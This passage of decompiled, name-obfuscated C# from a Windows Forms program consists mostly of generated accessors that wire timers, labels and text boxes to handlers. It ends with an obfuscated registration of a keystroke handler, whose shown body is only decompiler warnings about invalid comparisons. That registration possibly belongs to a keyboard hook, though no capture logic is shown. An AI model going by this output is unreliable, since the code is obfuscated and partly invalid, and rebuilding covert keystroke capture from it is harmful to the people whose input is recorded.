	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_77(Timer timer_7)
	{
		EventHandler eventHandler = method_2;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		timer_0 = timer_7;
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Timer vmethod_78()
	{
		return timer_1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_79(Timer timer_7)
	{
		EventHandler eventHandler = method_3;
		if (timer_1 != null)
		{
			timer_1.remove_Tick(eventHandler);
		}
		timer_1 = timer_7;
		if (timer_1 != null)
		{
			timer_1.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Timer vmethod_80()
	{
		return timer_2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_81(Timer timer_7)
	{
		EventHandler eventHandler = method_4;
		if (timer_2 != null)
		{
			timer_2.remove_Tick(eventHandler);
		}
		timer_2 = timer_7;
		if (timer_2 != null)
		{
			timer_2.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label vmethod_82()
	{
		return label_33;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_83(Label label_49)
	{
		label_33 = label_49;
	}

	[SpecialName]
	internal virtual TextBox vmethod_84()
	{
		return textBox_5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_85(TextBox textBox_20)
	{
		textBox_5 = textBox_20;
	}

	[SpecialName]
	internal virtual TextBox vmethod_86()
	{
		return textBox_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_87(TextBox textBox_20)
	{
		textBox_6 = textBox_20;
	}

	[SpecialName]
	internal virtual TextBox vmethod_88()
	{
		return textBox_7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_89(TextBox textBox_20)
	{
		textBox_7 = textBox_20;
	}

	[SpecialName]
	internal virtual TextBox vmethod_90()
	{
		return textBox_8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_91(TextBox textBox_20)
	{
		textBox_8 = textBox_20;
	}

	[SpecialName]
	internal virtual TextBox vmethod_92()
	{
		return textBox_9;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_93(TextBox textBox_20)
	{
		textBox_9 = textBox_20;
	}

	[SpecialName]
	internal virtual Label vmethod_94()
	{
		return label_34;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_95(Label label_49)
	{
		label_34 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_96()
	{
		return label_35;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_97(Label label_49)
	{
		label_35 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_98()
	{
		return label_36;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_99(Label label_49)
	{
		label_36 = label_49;
	}

	[SpecialName]
	internal virtual TextBox vmethod_100()
	{
		return textBox_10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_101(TextBox textBox_20)
	{
		textBox_10 = textBox_20;
	}

	[SpecialName]
	internal virtual TextBox vmethod_102()
	{
		return textBox_11;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_103(TextBox textBox_20)
	{
		textBox_11 = textBox_20;
	}

	[SpecialName]
	internal virtual Label vmethod_104()
	{
		return label_37;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_105(Label label_49)
	{
		label_37 = label_49;
	}

	[SpecialName]
	internal virtual ListBox vmethod_106()
	{
		return listBox_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_107(ListBox listBox_1)
	{
		listBox_0 = listBox_1;
	}

	[SpecialName]
	internal virtual Timer vmethod_108()
	{
		return timer_3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_109(Timer timer_7)
	{
		EventHandler eventHandler = method_6;
		if (timer_3 != null)
		{
			timer_3.remove_Tick(eventHandler);
		}
		timer_3 = timer_7;
		if (timer_3 != null)
		{
			timer_3.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox vmethod_110()
	{
		return textBox_12;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_111(TextBox textBox_20)
	{
		textBox_12 = textBox_20;
	}

	[SpecialName]
	internal virtual Label vmethod_112()
	{
		return label_38;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_113(Label label_49)
	{
		label_38 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_114()
	{
		return label_39;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_115(Label label_49)
	{
		label_39 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_116()
	{
		return label_40;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_117(Label label_49)
	{
		label_40 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_118()
	{
		return label_41;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_119(Label label_49)
	{
		label_41 = label_49;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_120(Timer timer_7)
	{
		EventHandler eventHandler = method_7;
		if (timer_4 != null)
		{
			timer_4.remove_Tick(eventHandler);
		}
		timer_4 = timer_7;
		if (timer_4 != null)
		{
			timer_4.add_Tick(eventHandler);
		}
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_121(Timer timer_7)
	{
		EventHandler eventHandler = method_9;
		if (timer_5 != null)
		{
			timer_5.remove_Tick(eventHandler);
		}
		timer_5 = timer_7;
		if (timer_5 != null)
		{
			timer_5.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Timer vmethod_122()
	{
		return timer_6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_123(Timer timer_7)
	{
		EventHandler eventHandler = method_8;
		if (timer_6 != null)
		{
			timer_6.remove_Tick(eventHandler);
		}
		timer_6 = timer_7;
		if (timer_6 != null)
		{
			timer_6.add_Tick(eventHandler);
		}
	}

	[SpecialName]
	internal virtual TextBox vmethod_124()
	{
		return textBox_13;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_125(TextBox textBox_20)
	{
		textBox_13 = textBox_20;
	}

	[SpecialName]
	internal virtual TextBox vmethod_126()
	{
		return textBox_14;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_127(TextBox textBox_20)
	{
		textBox_14 = textBox_20;
	}

	[SpecialName]
	internal virtual TextBox vmethod_128()
	{
		return textBox_15;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_129(TextBox textBox_20)
	{
		textBox_15 = textBox_20;
	}

	[SpecialName]
	internal virtual TextBox vmethod_130()
	{
		return textBox_16;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_131(TextBox textBox_20)
	{
		textBox_16 = textBox_20;
	}

	[SpecialName]
	internal virtual Label vmethod_132()
	{
		return label_42;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_133(Label label_49)
	{
		label_42 = label_49;
	}

	[SpecialName]
	internal virtual TextBox vmethod_134()
	{
		return textBox_17;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_135(TextBox textBox_20)
	{
		textBox_17 = textBox_20;
	}

	[SpecialName]
	internal virtual TextBox vmethod_136()
	{
		return textBox_18;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_137(TextBox textBox_20)
	{
		textBox_18 = textBox_20;
	}

	[SpecialName]
	internal virtual TextBox vmethod_138()
	{
		return textBox_19;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_139(TextBox textBox_20)
	{
		textBox_19 = textBox_20;
	}

	[SpecialName]
	internal virtual Label vmethod_140()
	{
		return label_43;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_141(Label label_49)
	{
		label_43 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_142()
	{
		return label_44;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_143(Label label_49)
	{
		label_44 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_144()
	{
		return label_45;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_145(Label label_49)
	{
		label_45 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_146()
	{
		return label_46;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_147(Label label_49)
	{
		label_46 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_148()
	{
		return label_47;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_149(Label label_49)
	{
		label_47 = label_49;
	}

	[SpecialName]
	internal virtual Label vmethod_150()
	{
		return label_48;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_151(Label label_49)
	{
		label_48 = label_49;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	private virtual void vmethod_152(Class5 class5_1)
	{
		Class5.Delegate1 delegate1_ = method_0;
		if (class5_0 != null)
		{
			Class34.smethod_10(delegate1_);
		}
		class5_0 = class5_1;
		if (class5_0 != null)
		{
			Class34.smethod_48(delegate1_);
		}
	}

	public void method_0(Keys keys_0)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Invalid comparison between Unknown and I4
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Invalid comparison between Unknown and I4
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Invalid comparison between Unknown and I4
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Invalid comparison between Unknown and I4
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Invalid comparison between Unknown and I4
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Invalid comparison between Unknown and I4
		//IL_0150: Unknown result type (might be due to invalid IL or missing references)
		//IL_0153: Invalid comparison between Unknown and I4
		//IL_017a: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Invalid comparison between Unknown and I4
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a7: Invalid comparison between Unknown and I4
		//IL_01ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d1: Invalid comparison between Unknown and I4
		//IL_01f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Invalid comparison between Unknown and I4
		//IL_0222: Unknown result type (might be due to invalid IL or missing references)
		//IL_0225: Invalid comparison between Unknown and I4
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_024f: Invalid comparison between Unknown and I4
		//IL_0276: Unknown result type (might be due to invalid IL or missing references)
		//IL_0279: Invalid comparison between Unknown and I4
		//IL_02a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a3: Invalid comparison between Unknown and I4
		//IL_02ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cd: Invalid comparison between Unknown and I4
		//IL_02f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f7: Invalid comparison between Unknown and I4
		//IL_031e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0321: Invalid comparison between Unknown and I4
		//IL_0348: Unknown result type (might be due to invalid IL or missing references)
		//IL_034b: Invalid comparison between Unknown and I4
		//IL_0372: Unknown result type (might be due to invalid IL or missing references)
		//IL_0375: Invalid comparison between Unknown and I4
		//IL_039c: Unknown result type (might be due to invalid IL or missing references)
		//IL_039f: Invalid comparison between Unknown and I4
		//IL_03c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c9: Invalid comparison between Unknown and I4
		//IL_03f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f3: Invalid comparison between Unknown and I4
		//IL_041a: Unknown result type (might be due to invalid IL or missing references)
		//IL_041d: Invalid comparison between Unknown and I4
		//IL_0444: Unknown result type (might be due to invalid IL or missing references)
		//IL_0447: Invalid comparison between Unknown and I4
		//IL_046e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0471: Invalid comparison between Unknown and I4
		//IL_0498: Unknown result type (might be due to invalid IL or missing references)
		//IL_049b: Invalid comparison between Unknown and I4
		//IL_04c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c5: Invalid comparison between Unknown and I4
		//IL_04ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ef: Invalid comparison between Unknown and I4
		//IL_0516: Unknown result type (might be due to invalid IL or missing references)
		//IL_0519: Invalid comparison between Unknown and I4
		//IL_0540: Unknown result type (might be due to invalid IL or missing references)
		//IL_0543: Invalid comparison between Unknown and I4
		//IL_056a: Unknown result type (might be due to invalid IL or missing references)
		//IL_056d: Invalid comparison between Unknown and I4
		//IL_0594: Unknown result type (might be due to invalid IL or missing references)
		//IL_0597: Invalid comparison between Unknown and I4
		//IL_05be: Unknown result type (might be due to invalid IL or missing references)
		//IL_05c1: Invalid comparison between Unknown and I4
		//IL_05e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_05eb: Invalid comparison between Unknown and I4
		//IL_0612: Unknown result type (might be due to invalid IL or missing references)
		//IL_0615: Invalid comparison between Unknown and I4
		//IL_063c: Unknown result type (might be due to invalid IL or missing references)
		//IL_063f: Invalid comparison between Unknown and I4
		//IL_0666: Unknown result type (might be due to invalid IL or missing references)
		//IL_0669: Invalid comparison between Unknown and I4
		//IL_0690: Unknown result type (might be due to invalid IL or missing references)
		//IL_0693: Invalid comparison between Unknown and I4
		//IL_06ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_06bd: Invalid comparison between Unknown and I4
		//IL_06e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e7: Invalid comparison between Unknown and I4
		//IL_070e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0711: Invalid comparison between Unknown and I4
		//IL_0738: Unknown result type (might be due to invalid IL or missing references)
		//IL_073b: Invalid comparison between Unknown and I4
		//IL_0762: Unknown result type (might be due to invalid IL or missing references)
		//IL_0765: Invalid comparison between Unknown and I4
		//IL_078c: Unknown result type (might be due to invalid IL or missing references)
		//IL_078f: Invalid comparison between Unknown and I4
		//IL_07b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07bc: Invalid comparison between Unknown and I4
		//IL_07e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e9: Invalid comparison between Unknown and I4
		//IL_0810: Unknown result type (might be due to invalid IL or missing references)
		//IL_0816: Invalid comparison between Unknown and I4
		//IL_083d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0843: Invalid comparison between Unknown and I4
		//IL_086a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0870: Invalid comparison between Unknown and I4
		//IL_0897: Unknown result type (might be due to invalid IL or missing references)
		//IL_089d: Invalid comparison between Unknown and I4
		//IL_08c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_08ca: Invalid comparison between Unknown and I4
		//IL_08f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f7: Invalid comparison between Unknown and I4
		//IL_091e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0924: Invalid comparison between Unknown and I4
		//IL_094b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0951: Invalid comparison between Unknown and I4
		//IL_0978: Unknown result type (might be due to invalid IL or missing references)
		//IL_097b: Invalid comparison between Unknown and I4
		//IL_09a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_09a5: Invalid comparison between Unknown and I4
		//IL_09cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_09cf: Invalid comparison between Unknown and I4
		//IL_09f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f9: Invalid comparison between Unknown and I4
		//IL_0a20: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a23: Invalid comparison between Unknown and I4
		//IL_0a4a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a4d: Invalid comparison between Unknown and I4
		//IL_0a74: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a77: Invalid comparison between Unknown and I4
		//IL_0a9e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0aa1: Invalid comparison between Unknown and I4
		//IL_0ac8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0acb: Invalid comparison between Unknown and I4
		//IL_0af2: Unknown result type (might be due to invalid IL or missing references)
		//IL_0af5: Invalid comparison between Unknown and I4
		//IL_0b1c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b1f: Invalid comparison between Unknown and I4
		//IL_0b46: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b49: Invalid comparison between Unknown and I4
		//IL_0b70: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b73: Invalid comparison between Unknown and I4
		//IL_0b9a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b9d: Invalid comparison between Unknown and I4
		//IL_0bc4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bc7: Invalid comparison between Unknown and I4
		//IL_0bee: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bf0: Invalid comparison between Unknown and I4
		//IL_0c17: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c1a: Invalid comparison between Unknown and I4
		//IL_0c41: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c44: Invalid comparison between Unknown and I4
		//IL_0c6b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c6e: Invalid comparison between Unknown and I4
		//IL_0c95: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c98: Invalid comparison between Unknown and I4
		//IL_0cbf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cc2: Invalid comparison between Unknown and I4
		//IL_0ce9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cec: Invalid comparison between Unknown and I4
		//IL_0d13: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d16: Invalid comparison between Unknown and I4
		//IL_0d3d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d40: Invalid comparison between Unknown and I4
		//IL_0d67: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d6a: Invalid comparison between Unknown and I4
		//IL_0d91: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d94: Invalid comparison between Unknown and I4
		//IL_0dbb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dbe: Invalid comparison between Unknown and I4
		//IL_0de5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0de8: Invalid comparison between Unknown and I4
		//IL_0e39: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e3c: Invalid comparison between Unknown and I4
		//IL_0e63: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e66: Invalid comparison between Unknown and I4
		//IL_0e8d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e90: Invalid comparison between Unknown and I4
		//IL_0eb7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eba: Invalid comparison between Unknown and I4
		//IL_0ee1: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ee4: Invalid comparison between Unknown and I4
		//IL_0f0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f0e: Invalid comparison between Unknown and I4
		//IL_0f35: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f38: Invalid comparison between Unknown and I4
		//IL_0f5f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f62: Invalid comparison between Unknown and I4
		//IL_0f89: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f8c: Invalid comparison between Unknown and I4
		//IL_0fb3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fb6: Invalid comparison between Unknown and I4
		//IL_0fdd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fe0: Invalid comparison between Unknown and I4
		//IL_1007: Unknown result type (might be due to invalid IL or missing references)
		//IL_100a: Invalid comparison between Unknown and I4
		//IL_1031: Unknown result type (might be due to invalid IL or missing references)
		//IL_1034: Invalid comparison between Unknown and I4
		//IL_105b: Unknown result type (might be due to invalid IL or missing references)
		//IL_105e: Invalid comparison between Unknown and I4
		//IL_1085: Unknown result type (might be due to invalid IL or missing references)
		//IL_1088: Invalid comparison between Unknown and I4
		//IL_10af: Unknown result type (might be due to invalid IL or missing references)
		//IL_10b2: Invalid comparison between Unknown and I4
		//IL_10d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_10dc: Invalid comparison between Unknown and I4
		//IL_1103: Unknown result type (might be due to invalid IL or missing references)
		//IL_1106: Invalid comparison between Unknown and I4
		//IL_112d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1130: Invalid comparison between Unknown and I4
		//IL_1157: Unknown result type (might be due to invalid IL or missing references)
		//IL_115a: Invalid comparison between Unknown and I4
		//IL_1181: Unknown result type (might be due to invalid IL or missing references)
		//IL_1184: Invalid comparison between Unknown and I4
		//IL_11ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_11ae: Invalid comparison between Unknown and I4
		//IL_11d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_11d8: Invalid comparison between Unknown and I4
		//IL_11ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_1202: Invalid comparison between Unknown and I4
		//IL_1229: Unknown result type (might be due to invalid IL or missing references)
		//IL_122c: Invalid comparison between Unknown and I4
		//IL_1253: Unknown result type (might be due to invalid IL or missing references)
		//IL_1256: Invalid comparison between Unknown and I4
		//IL_127d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1280: Invalid comparison between Unknown and I4
		//IL_12a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_12aa: Invalid comparison between Unknown and I4
		//IL_12d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_12d4: Invalid comparison between Unknown and I4
		//IL_12fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_12fe: Invalid comparison between Unknown and I4
		//IL_1325: Unknown result type (might be due to invalid IL or missing references)
		//IL_1328: Invalid comparison between Unknown and I4
		//IL_134f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1352: Invalid comparison between Unknown and I4
		//IL_1379: Unknown result type (might be due to invalid IL or missing references)
		//IL_137c: Invalid comparison between Unknown and I4
		//IL_13a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_13a6: Invalid comparison between Unknown and I4
		//IL_13cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_13d0: Invalid comparison between Unknown and I4
		//IL_13f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_13fa: Invalid comparison between Unknown and I4
		//IL_1421: Unknown result type (might be due to invalid IL or missing references)
		//IL_1424: Invalid comparison between Unknown and I4
		//IL_144b: Unknown result type (might be due to invalid IL or missing references)
		//IL_144e: Invalid comparison between Unknown and I4
		//IL_1475: Unknown result type (might be due to invalid IL or missing references)
		//IL_1478: Invalid comparison between Unknown and I4
		//IL_149f: Unknown result type (might be due to invalid IL or missing references)
		//IL_14a2: Invalid comparison between Unknown and I4
		//IL_14c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_14cc: Invalid comparison between Unknown and I4
		//IL_14f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_14f6: Invalid comparison between Unknown and I4
		//IL_151d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1520: Invalid comparison between Unknown and I4
		//IL_1547: Unknown result type (might be due to invalid IL or missing references)
		//IL_154a: Invalid comparison between Unknown and I4
		//IL_1571: Unknown result type (might be due to invalid IL or missing references)
		//IL_1574: Invalid comparison between Unknown and I4
		//IL_159b: Unknown result type (might be due to invalid IL or missing references)
		//IL_159e: Invalid comparison between Unknown and I4
		//IL_15c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_15cb: Invalid comparison between Unknown and I4
		//IL_15f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_15f8: Invalid comparison between Unknown and I4
		//IL_161f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1625: Invalid comparison between Unknown and I4
		//IL_164c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1652: Invalid comparison between Unknown and I4
		//IL_1679: Unknown result type (might be due to invalid IL or missing references)
		//IL_167f: Invalid comparison between Unknown and I4
		//IL_16a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_16ac: Invalid comparison between Unknown and I4
		//IL_16d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_16d9: Invalid comparison between Unknown and I4
		//IL_1700: Unknown result type (might be due to invalid IL or missing references)
		//IL_1706: Invalid comparison between Unknown and I4
		//IL_172d: Unknown result type (might be due to invalid IL or missing references)
		//IL_1733: Invalid comparison between Unknown and I4
		//IL_175a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1760: Invalid comparison between Unknown and I4
		//IL_1787: Unknown result type (might be due to invalid IL or missing references)
		//IL_178a: Invalid comparison between Unknown and I4
		//IL_17b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_17b4: Invalid comparison between Unknown and I4
		//IL_17db: Unknown result type (might be due to invalid IL or missing references)
		//IL_17de: Invalid comparison between Unknown and I4
		//IL_1805: Unknown result type (might be due to invalid IL or missing references)
		//IL_1808: Invalid comparison between Unknown and I4
		//IL_182f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1832: Invalid comparison between Unknown and I4
		//IL_1859: Unknown result type (might be due to invalid IL or missing references)
		//IL_185c: Invalid comparison between Unknown and I4
		//IL_1883: Unknown result type (might be due to invalid IL or missing references)
		//IL_1886: Invalid comparison between Unknown and I4
		//IL_18ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_18b0: Invalid comparison between Unknown and I4
		//IL_18d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_18da: Invalid comparison between Unknown and I4
		//IL_1901: Unknown result type (might be due to invalid IL or missing references)
		//IL_1904: Invalid comparison between Unknown and I4
		//IL_192b: Unknown result type (might be due to invalid IL or missing references)
		//IL_192e: Invalid comparison between Unknown and I4
		//IL_1955: Unknown result type (might be due to invalid IL or missing references)
		//IL_1958: Invalid comparison between Unknown and I4
		//IL_197f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1982: Invalid comparison between Unknown and I4
		//IL_19a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_19ac: Invalid comparison between Unknown and I4
		//IL_19d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_19d6: Invalid comparison between Unknown and I4
		//IL_19fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_19ff: Invalid comparison between Unknown and I4
		//IL_1a26: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a29: Invalid comparison between Unknown and I4
		//IL_1a50: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a53: Invalid comparison between Unknown and I4
		//IL_1a7a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a7d: Invalid comparison between Unknown and I4
		//IL_1aa4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1aa7: Invalid comparison between Unknown and I4
		//IL_1ace: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ad1: Invalid comparison between Unknown and I4
		//IL_1af8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1afb: Invalid comparison between Unknown and I4
		//IL_1b22: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b25: Invalid comparison between Unknown and I4
		//IL_1b4c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b4f: Invalid comparison between Unknown and I4
		//IL_1b76: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b79: Invalid comparison between Unknown and I4
		//IL_1ba0: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ba3: Invalid comparison between Unknown and I4
		//IL_1bca: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bcd: Invalid comparison between Unknown and I4
		//IL_1bf4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1bf7: Invalid comparison between Unknown and I4
		//IL_1c45: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c48: Invalid comparison between Unknown and I4
		//IL_1c6f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c72: Invalid comparison between Unknown and I4
		//IL_1c99: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c9c: Invalid comparison between Unknown and I4
		//IL_1cc3: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cc6: Invalid comparison between Unknown and I4
		//IL_1ced: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cf0: Invalid comparison between Unknown and I4
		//IL_1d17: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d1a: Invalid comparison between Unknown and I4
		//IL_1d41: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d44: Invalid comparison between Unknown and I4
